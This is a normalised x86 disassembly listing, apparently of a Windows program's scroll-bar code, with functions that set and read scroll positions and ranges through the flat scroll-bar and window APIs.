mov [ edi + 0x44 ] 0x1
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_448694
mov eax edi
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
call sub_4486ec
pop [ fs : 0x0 ]
add esp 0xc
sub_47714c
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ r-xdata ]
call sub_448388
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_424dc0
mov edi esi
movzx edx [ edi + 0x1c ]
mov eax ebx
call sub_477a1c
mov edx [ edi + 0x10 ]
mov eax ebx
call sub_4779f8
mov edx [ edi + 0xc ]
mov eax ebx
call sub_4778b0
movzx eax [ edi + 0x8 ]
mov [ ebx + 0x8 ] ax
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_47719c
push ebx
mov ebx eax
cmp [ ebx + 0x18 ] 0x0
jne r-xdata
pop ebx
retn
mov eax ebx
call sub_47735c
test al al
je r-xdata
mov eax [ ebx + 0x4 ]
call sub_48e6e4
test al al
jne r-xdata
mov edx [ ebx + 0x10 ]
mov eax ebx
call sub_4778b0
xor edx edx
mov eax ebx
call sub_4778b0
jmp r-xdata
sub_4771d4
push ebp
mov ebp esp
push ebx
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
je r-xdata
pop ebx
pop ebp
retn
movzx eax [ ebx + 0x5b ]
sub al 0x1
jb r-xdata
cmp [ ebx + 0x5b ] 0x3
je r-xdata
sub al 0x2
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
mov edx [ edx + 0xc ]
add edx [ ebx + 0x40 ]
add edx [ ebx + 0x48 ]
cmp edx eax
jl r-xdata
movzx eax [ r-xdata ]
and al [ ebx + 0x61 ]
movzx edx [ r-xdata ]
cmp dl al
jne r-xdata
dec al
je r-xdata
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
jmp r-xdata
mov eax edx
mov eax [ ebp + 0x8 ]
mov edx [ ebx + 0x48 ]
add [ eax - 0xc ] edx
jmp r-xdata
sub_477244
push ebp
mov ebp esp
push ebx
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
je r-xdata
pop ebx
pop ebp
retn
movzx eax [ ebx + 0x5b ]
sub al 0x2
jb r-xdata
cmp [ ebx + 0x5b ] 0x1
je r-xdata
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
mov edx [ edx + 0xc ]
add edx [ ebx + 0x44 ]
add edx [ ebx + 0x4c ]
cmp edx eax
jl r-xdata
movzx eax [ r-xdata ]
and al [ ebx + 0x61 ]
movzx edx [ r-xdata ]
cmp dl al
jne r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ ebx + 0x4c ]
add [ eax - 0xc ] edx
jmp r-xdata
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
jmp r-xdata
mov eax edx
sub_4772b0
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
mov ebx [ eax + 0x4 ]
cmp [ ebx + 0x268 ] 0x0
je r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0xdc ]
test al al
je r-xdata
xor edx edx
mov eax [ ebp - 0x8 ]
call sub_4779e0
xor eax eax
mov [ ebp - 0x4 ] eax
xor eax eax
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
call sub_492534
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov edx [ ebp - 0x4 ]
add edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
movzx eax [ eax + 0x1a ]
add edx eax
mov eax [ ebp - 0x8 ]
call sub_4779e0
jmp r-xdata
inc ebx
xor esi esi
push ebp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
mov edx esi
call sub_4924f8
call sub_477244
pop ecx
push ebp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
mov edx esi
call sub_4924f8
call sub_4771d4
pop ecx
jmp r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x18 ] 0x0
jne r-xdata
inc esi
dec ebx
jne r-xdata
sub_47735c
push ebx
push esi
mov ebx eax
mov esi 0x100000
cmp [ ebx + 0x18 ] 0x1
jne r-xdata
cmp [ ebx + 0x1c ] 0x0
je r-xdata
mov esi 0x200000
xor eax eax
pop esi
pop ebx
retn
push 0xfffffff0
mov eax [ ebx + 0x4 ]
call sub_496868
push eax
call GetWindowLongW
test eax esi
jne r-xdata
mov al 0x1
pop esi
pop ebx
retn
sub_477394
push ebp
mov ebp esp
push ebx
mov ebx 0x100000
cmp ax 0x1
jne r-xdata
push 0xfffffff0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_496868
push eax
call GetWindowLongW
test eax ebx
setne al
pop ebx
pop ebp
retn
mov ebx 0x200000
sub_4773c8
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi edx
mov esi eax
xor ebx ebx
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x5 ] 0x0
jne r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x6 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x6 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax esi
call sub_477394
pop ecx
test al al
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax esi
call sub_477394
pop ecx
test al al
je r-xdata
movzx eax di
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov ebx eax
mov eax [ ebp + 0x8 ]
sub ebx [ eax - 0xc ]
neg ebx
jmp r-xdata
movzx eax di
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov ebx eax
mov eax [ ebp + 0x8 ]
sub ebx [ eax - 0xc ]
sub_477444
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
mov [ ebp - 0x6 ] cl
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
push 0xfffffff0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_496868
push eax
call GetWindowLongW
test eax 0x840000
setne al
and eax 0x7f
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x18 ] 0x1
jne r-xdata
push ebp
mov dx 0x14
mov ax 0x1
call sub_4773c8
pop ecx
mov ebx eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_48d878
add ebx eax
mov eax ebx
push ebp
mov dx 0x15
xor eax eax
call sub_4773c8
pop ecx
mov ebx eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_48d8bc
add ebx eax
mov eax ebx
jmp r-xdata
pop ebx
mov esp ebp
pop ebp
retn
sub_4774dc
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
mov [ ebp - 0x1c ] 0x1c
mov [ ebp - 0x18 ] 0x10
xor ebx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp [ eax + 0x18 ] 0x1
jne r-xdata
mov eax [ ebp + 0x8 ]
mov esi [ eax - 0x8 ]
movsx esi [ esi + 0x6 ]
lea eax [ ebp - 0x1c ]
push eax
push ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_496868
push eax
call FlatSB_GetScrollInfo
test eax eax
je r-xdata
mov ebx 0x1
mov eax esi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov esi [ ebp - 0x4 ]
sub_477538
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1f ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
movsx eax [ eax + 0x4 ]
cmp eax 0x7
ja r-xdata
mov eax [ ebp - 0x8 ]
movzx eax [ eax + 0x4 ]
sub ax 0x4
jae r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
jmp [ eax * 4 + jump_table_477712 ]
mov eax [ ebp - 0x8 ]
movzx eax [ eax + 0x4 ]
sub ax 0x2
jb r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x8 ]
sub edx eax
mov eax [ ebp - 0x4 ]
call sub_4778b0
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x8 ]
add edx eax
mov eax [ ebp - 0x4 ]
call sub_4778b0
jmp r-xdata
xor ecx ecx
mov dl 0x1
mov eax [ ebp - 0x4 ]
call sub_477444
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0xc ]
sub edx eax
mov eax [ ebp - 0x4 ]
call sub_4778b0
jmp r-xdata
xor ecx ecx
mov dl 0x1
mov eax [ ebp - 0x4 ]
call sub_477444
mov edx eax
mov eax [ ebp - 0x4 ]
add edx [ eax + 0xc ]
mov eax [ ebp - 0x4 ]
call sub_4778b0
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x14 ] 0x7fff
jle r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1d ] 0x0
je r-xdata
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_4778b0
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x14 ]
mov eax [ ebp - 0x4 ]
call sub_4778b0
mov eax [ ebp - 0x4 ]
movzx ebx [ eax + 0x8 ]
mov eax ebx
mov edx [ ebp - 0x4 ]
mov ecx [ edx + 0x40 ]
cdq
idiv ecx
mov [ ebp - 0xc ] eax
mov eax ebx
cdq
idiv ecx
mov [ ebp - 0x10 ] edx
mov edi ecx
jmp r-xdata
sub ax 0x2
jb r-xdata
mov edx [ ebp - 0x8 ]
movsx edx [ edx + 0x6 ]
mov eax [ ebp - 0x4 ]
call sub_4778b0
jmp r-xdata
push ebp
call sub_4774dc
pop ecx
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_4778b0
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x14 ] 0x7fff
jle r-xdata
xor eax eax
mov [ ebp - 0x14 ] eax
test edi edi
jle r-xdata
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0xa ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x3c ]
mov eax [ ebp - 0xc ]
cdq
idiv ebx
mov [ ebp - 0x10 ] edx
mov eax [ ebp - 0xc ]
cdq
idiv ebx
mov [ ebp - 0xc ] eax
mov edi ebx
jmp r-xdata
jmp r-xdata
mov edx [ ebp - 0x8 ]
movsx edx [ edx + 0x6 ]
mov eax [ ebp - 0x4 ]
call sub_4778b0
jmp r-xdata
push ebp
call sub_4774dc
pop ecx
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_4778b0
jmp r-xdata
cmp [ ebp - 0x10 ] 0x0
jle r-xdata
call GetTickCount
mov ebx eax
mov esi ebx
sub esi [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
cmp esi [ eax + 0x20 ]
jae r-xdata
xor edi edi
xor eax eax
mov [ ebp - 0xc ] eax
xor eax eax
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x8 ]
movzx eax [ eax + 0x4 ]
sub ax 0x1
jb r-xdata
mov [ ebp - 0x14 ] ebx
mov eax [ ebp - 0x8 ]
movzx eax [ eax + 0x4 ]
sub ax 0x1
jb r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20 ]
sub eax esi
push eax
call Sleep
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
sub edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_4778b0
jmp r-xdata
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
sub edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_4778b0
jmp r-xdata
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
add edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_4778b0
jmp r-xdata
dec ax
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x8c ]
dec edi
test edi edi
jg r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
add edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_4778b0
jmp r-xdata
dec ax
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
sub edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_4778b0
jmp r-xdata
dec ax
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
sub edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_4778b0
jmp r-xdata
dec ax
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
add edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_4778b0
jmp r-xdata
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
add edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_4778b0
jmp r-xdata
sub_477838
push ebx
push esi
mov ebx eax
cmp edx [ ebx + 0x24 ]
je r-xdata
pop esi
pop ebx
retn
mov esi edx
test esi esi
jne r-xdata
mov [ ebx + 0x24 ] edx
mov [ ebx + 0x44 ] 0x1
mov eax [ ebx + 0x4 ]
call sub_477f20
test esi esi
jne r-xdata
movzx eax [ ebx + 0x18 ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edx eax
xor eax eax
mov [ ebx + 0x24 ] eax
sub_4778b0
push ebx
push esi
push edi
mov ebx eax
mov eax [ ebx + 0x4 ]
test [ eax + 0x1c ] 0x2
je r-xdata
mov eax [ ebx + 0x14 ]
cmp edx eax
jle r-xdata
mov [ ebx + 0xc ] edx
jmp r-xdata
test edx edx
jge r-xdata
mov edx eax
jmp r-xdata
pop edi
pop esi
pop ebx
retn
cmp [ ebx + 0x18 ] 0x0
jne r-xdata
xor edx edx
mov si 0x1
xor esi esi
jmp r-xdata
movzx edi si
push edi
mov eax [ ebx + 0x4 ]
call sub_496868
push eax
call FlatSB_GetScrollPos
cmp eax [ ebx + 0xc ]
je r-xdata
mov [ ebx + 0xc ] edx
cmp [ ebx + 0x18 ] 0x0
jne r-xdata
mov eax [ ebx + 0xc ]
cmp edx eax
je r-xdata
push 0xffffffff
mov eax [ ebx + 0xc ]
push eax
push edi
mov eax [ ebx + 0x4 ]
call sub_496868
push eax
call FlatSB_SetScrollPos
mov ecx eax
sub ecx edx
mov eax [ ebx + 0x4 ]
xor edx edx
call sub_496414
sub eax edx
mov edx eax
xor ecx ecx
mov eax [ ebx + 0x4 ]
call sub_496414
jmp r-xdata
xor edx edx
call sub_477028
test eax eax
je r-xdata
mov eax [ ebx + 0x4 ]
test [ eax + 0x1c ] 0x10
je r-xdata
cmp [ eax + 0x2a8 ] 0x0
je r-xdata
mov eax [ eax + 0x2a8 ]
mov edx [ eax ]
call [ edx + 0xc ]
sub_47796c
push ebx
push esi
mov ebx eax
cmp edx [ ebx + 0x30 ]
je r-xdata
pop esi
pop ebx
retn
mov esi edx
test esi esi
jne r-xdata
mov [ ebx + 0x30 ] edx
mov [ ebx + 0x44 ] 0x1
mov eax [ ebx + 0x4 ]
call sub_477f20
test esi esi
jne r-xdata
movzx eax [ ebx + 0x18 ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edx eax
xor eax eax
mov [ ebx + 0x30 ] eax
sub_477a28
push ebp
mov ebp esp
push ebx
push esi
mov ebx eax
mov esi [ ebp + 0x8 ]
add esi 0xfffffffc
cmp bl 0x1
cmc
sbb eax eax
push eax
mov eax [ esi ]
movzx eax [ eax + 0x34 ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ esi ]
movzx eax [ eax + 0x18 ]
lea eax [ eax + eax * 4 ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ esi ]
mov eax [ eax + 0x4 ]
call sub_496868
push eax
call FlatSB_SetScrollProp
mov eax [ esi ]
cmp [ eax + 0x24 ] 0x0
jle r-xdata
mov eax [ esi ]
cmp [ eax + 0x38 ] 0x0
jle r-xdata
push 0x0
mov eax [ esi ]
mov eax [ eax + 0x24 ]
push eax
mov eax [ esi ]
movzx eax [ eax + 0x18 ]
lea eax [ eax + eax * 4 ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ esi ]
mov eax [ eax + 0x4 ]
call sub_496868
push eax
call FlatSB_SetScrollProp
mov eax [ esi ]
cmp [ eax + 0x30 ] 0x0
jle r-xdata
push 0x0
mov eax [ esi ]
mov eax [ eax + 0x38 ]
push eax
mov eax [ esi ]
movzx eax [ eax + 0x18 ]
lea eax [ eax + eax * 4 ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ esi ]
mov eax [ eax + 0x4 ]
call sub_496868
push eax
call FlatSB_SetScrollProp
push 0x0
mov eax [ esi ]
mov eax [ eax + 0x28 ]
call sub_46cf24
push eax
mov eax [ esi ]
movzx eax [ eax + 0x18 ]
lea eax [ eax + eax * 4 ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ esi ]
mov eax [ eax + 0x4 ]
call sub_496868
push eax
call FlatSB_SetScrollProp
pop esi
pop ebx
pop ebp
retn
push 0x0
mov eax [ esi ]
mov eax [ eax + 0x30 ]
push eax
mov eax [ esi ]
movzx eax [ eax + 0x18 ]
lea eax [ eax + eax * 4 ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ esi ]
mov eax [ eax + 0x4 ]
call sub_496868
push eax
call FlatSB_SetScrollProp
sub_477b30
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
push esi
push edi
mov [ ebp - 0x6 ] cl
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
lea esi [ ebp - 0x4 ]
mov eax [ esi ]
xor edx edx
mov [ eax + 0x14 ] edx
xor ebx ebx
mov eax [ esi ]
cmp [ eax + 0x18 ] 0x1
jne r-xdata
mov eax [ esi ]
cmp [ eax + 0x1c ] 0x0
je r-xdata
mov bx 0x1
mov [ ebp - 0x22 ] 0x1c
mov [ ebp - 0x1e ] 0x17
xor eax eax
mov [ ebp - 0x1a ] eax
mov eax [ esi ]
cmp [ eax + 0x14 ] 0x0
jle r-xdata
movzx ecx [ ebp - 0x6 ]
movzx edx [ ebp - 0x5 ]
mov eax [ esi ]
call sub_477444
mov edx [ esi ]
mov edi [ edx + 0x10 ]
sub edi eax
mov eax [ esi ]
mov [ eax + 0x14 ] edi
test edi edi
jge r-xdata
xor eax eax
mov [ ebp - 0x16 ] eax
mov eax [ esi ]
mov eax [ eax + 0x10 ]
mov [ ebp - 0x16 ] eax
jmp r-xdata
mov eax [ esi ]
xor edx edx
mov [ eax + 0x14 ] edx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
movzx eax bx
mov ecx 0xa
xor edx edx
div ecx
mov edx [ esi ]
mov [ edx + 0x8 ] ax
movzx ecx [ ebp - 0x6 ]
movzx edx [ ebp - 0x5 ]
mov eax [ esi ]
call sub_477444
inc eax
mov [ ebp - 0x12 ] eax
mov eax [ esi ]
mov eax [ eax + 0xc ]
mov [ ebp - 0xe ] eax
mov [ ebp - 0xa ] eax
mov edx [ esi ]
xor eax eax
mov [ edx + 0x44 ] al
push ebp
call sub_477a28
pop ecx
push 0xffffffff
lea eax [ ebp - 0x22 ]
push eax
movzx eax bx
push eax
mov eax [ esi ]
mov eax [ eax + 0x4 ]
call sub_496868
push eax
call FlatSB_SetScrollInfo
mov eax [ esi ]
mov edx [ eax + 0xc ]
mov eax [ esi ]
call sub_4778b0
xor ecx ecx
mov dl 0x1
mov eax [ esi ]
call sub_477444
lea eax [ eax + eax * 8 ]
mov ecx 0xa
cdq
idiv ecx
mov ebx eax
mov eax [ esi ]
mov [ eax + 0xa ] bx
mov eax [ esi ]
cmp [ eax + 0x1f ] 0x0
je r-xdata
sub_477c44
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_490f20
mov eax [ esi + 0x50 ]
or eax [ r-xdata ]
mov [ esi + 0x50 ] eax
push 0x0
mov ecx esi
mov dl 0x1
mov eax [ r-xdata ]
call sub_4770b8
mov [ esi + 0x260 ] eax
push 0x1
mov ecx esi
mov dl 0x1
mov eax [ r-xdata ]
call sub_4770b8
mov [ esi + 0x264 ] eax
mov [ esi + 0x268 ] 0x0
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_448694
mov eax esi
pop esi
pop ebx
retn
call sub_4486ec
pop [ fs : 0x0 ]
add esp 0xc
sub_477cbc
push ebx
push esi
call sub_44873c
mov ebx edx
mov esi eax
mov eax [ esi + 0x260 ]
call sub_4481b0
mov eax [ esi + 0x264 ]
call sub_4481b0
mov edx ebx
and dl 0xfc
mov eax esi
call sub_49107c
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4486e4
sub_477d08
push ebx
mov ebx eax
mov eax ebx
call sub_4927d4
mov eax [ rw-data ]
cmp [ eax + 0xd ] 0x0
jne r-xdata
mov eax ebx
call sub_477f20
pop ebx
retn
mov edx 0x1
mov eax 0x5
call sub_43a7f0
test al al
jne r-xdata
mov eax ebx
call sub_496868
push eax
call InitializeFlatSB
sub_477d48
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
call sub_477ea0
mov ecx edi
mov edx esi
mov eax ebx
call sub_491de4
pop edi
pop esi
pop ebx
retn
sub_477d88
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_448180
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_477e90
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_48d878
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x260 ]
mov eax ebx
call sub_47735c
test al al
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebx + 0x10 ]
cmp eax [ ebp - 0x8 ]
jg r-xdata
mov [ ebp - 0x9 ] al
cmp [ ebp - 0x9 ] 0x0
je r-xdata
mov al 0x1
mov eax [ ebp - 0x4 ]
call sub_492534
mov esi eax
dec esi
test esi esi
jl r-xdata
mov eax [ ebx + 0x10 ]
mov [ ebp - 0x8 ] eax
xor edx edx
mov eax ebx
call sub_4778b0
mov eax [ ebp - 0x10 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
inc esi
xor ebx ebx
cmp [ ebp - 0x9 ] 0x0
je r-xdata
inc esi
xor ebx ebx
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_4924f8
mov edi eax
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_4924f8
mov edx eax
mov eax [ ebp - 0x10 ]
call sub_424590
mov edx [ ebp - 0x8 ]
sub edx [ edi + 0x48 ]
sub edx [ edi + 0x40 ]
mov eax edi
call sub_48d590
inc ebx
dec esi
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_477e97
mov eax [ ebp - 0x10 ]
call sub_4481b0
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x260 ]
call sub_47719c
push 0x0
mov edx ebx
mov eax [ ebp - 0x10 ]
call sub_4246e8
xor ecx ecx
mov edx 0xb03e
call sub_48f2b0
inc ebx
dec esi
jne r-xdata
sub_477ec4
push ebx
mov ebx eax
cmp dl [ ebx + 0x268 ]
je r-xdata
pop ebx
retn
mov [ ebx + 0x268 ] dl
test dl dl
je r-xdata
xor edx edx
mov eax [ ebx + 0x260 ]
call sub_4779f8
xor edx edx
mov eax [ ebx + 0x264 ]
call sub_4779f8
mov eax ebx
call sub_477ea0
jmp r-xdata
sub_477f20
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x270 ] 0x0
jne r-xdata
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_496c14
test al al
je r-xdata
xor eax eax
push ebp
push sub_47800b
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov [ eax + 0x270 ] 0x1
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x264 ]
call sub_4774c4
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x260 ]
call sub_4774c4
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x260 ]
mov cl 0x1
xor edx edx
call sub_477b30
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x264 ]
xor ecx ecx
mov dl 0x1
call sub_477b30
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x264 ]
xor ecx ecx
xor edx edx
call sub_477b30
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x260 ]
xor ecx ecx
mov dl 0x1
call sub_477b30
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x264 ]
mov cl 0x1
xor edx edx
call sub_477b30
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x260 ]
xor ecx ecx
mov dl 0x1
call sub_477b30
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x270 ] 0x0
retn
sub_478030
push ebx
push esi
push edi
push ebp
add esp 0xffffffe0
mov esi edx
mov ebx eax
mov edi esp
test esi esi
je r-xdata
add esp 0x20
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx edi
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ ebx + 0x260 ]
movzx eax [ eax + 0x1a ]
sub [ edi ] eax
add [ edi + 0x8 ] eax
mov eax [ ebx + 0x264 ]
movzx eax [ eax + 0x1a ]
sub [ edi + 0x4 ] eax
add [ edi + 0xc ] eax
lea ecx [ esp + 0x18 ]
mov edx edi
mov eax esi
call sub_48d98c
lea edx [ esp + 0x18 ]
lea ecx [ esp + 0x10 ]
mov eax ebx
call sub_48dac0
mov eax [ esp + 0x10 ]
mov [ edi ] eax
mov eax [ esp + 0x14 ]
mov [ edi + 0x4 ] eax
lea ecx [ esp + 0x18 ]
lea edx [ edi + 0x8 ]
mov eax esi
call sub_48d98c
lea edx [ esp + 0x18 ]
lea ecx [ esp + 0x10 ]
mov eax ebx
call sub_48dac0
mov eax [ esp + 0x10 ]
mov [ edi + 0x8 ] eax
mov eax [ esp + 0x14 ]
mov [ edi + 0xc ] eax
mov esi [ edi ]
test esi esi
jge r-xdata
mov eax ebx
call sub_48d878
mov ebp [ edi + 0x8 ]
cmp eax ebp
jge r-xdata
mov eax [ ebx + 0x260 ]
mov edx [ eax + 0xc ]
add edx esi
call sub_4778b0
jmp r-xdata
mov esi [ edi + 0x4 ]
test esi esi
jge r-xdata
mov eax ebx
call sub_48d878
sub ebp esi
cmp eax ebp
jge r-xdata
mov eax ebx
call sub_48d8bc
mov ebp [ edi + 0xc ]
cmp eax ebp
jge r-xdata
mov eax [ ebx + 0x264 ]
mov edx [ eax + 0xc ]
add edx esi
call sub_4778b0
jmp r-xdata
mov esi [ ebx + 0x260 ]
mov eax ebx
call sub_48d878
mov edx [ esi + 0xc ]
add edx [ edi + 0x8 ]
sub edx eax
mov eax esi
call sub_4778b0
mov eax ebx
call sub_48d878
add eax [ edi ]
mov [ edi + 0x8 ] eax
mov eax ebx
call sub_48d8bc
sub ebp esi
cmp eax ebp
jge r-xdata
mov esi [ ebx + 0x264 ]
mov eax ebx
call sub_48d8bc
mov edx [ esi + 0xc ]
add edx [ edi + 0xc ]
sub edx eax
mov eax esi
call sub_4778b0
mov eax ebx
call sub_48d8bc
add eax [ edi + 0x4 ]
mov [ edi + 0xc ] eax
sub_478184
push ebx
push esi
push edi
push ebp
mov edi ecx
mov esi edx
mov ebx eax
cmp edi esi
je r-xdata
mov eax [ ebx + 0x260 ]
mov [ eax + 0x1e ] 0x0
mov eax [ ebx + 0x264 ]
mov [ eax + 0x1e ] 0x0
pop ebp
pop edi
pop esi
pop ebx
retn
test [ ebx + 0x1c ] 0x1
jne r-xdata
xor edx edx
mov eax [ ebx + 0x260 ]
call sub_4778b0
xor edx edx
mov eax [ ebx + 0x264 ]
call sub_4778b0
cmp [ ebx + 0x268 ] 0x0
jne r-xdata
mov eax [ ebx + 0x260 ]
mov [ eax + 0x1e ] 0x1
mov eax [ ebx + 0x264 ]
mov [ eax + 0x1e ] 0x1
mov ebp [ ebx + 0x260 ]
cmp [ ebp + 0x1e ] 0x0
je r-xdata
mov ebp [ ebx + 0x264 ]
cmp [ ebp + 0x1e ] 0x0
je r-xdata
push edi
push esi
mov eax [ ebp + 0x10 ]
push eax
call MulDiv
mov edx eax
mov eax ebp
call sub_4779f8
push edi
push esi
mov eax [ ebp + 0x10 ]
push eax
call MulDiv
mov edx eax
mov eax ebp
call sub_4779f8
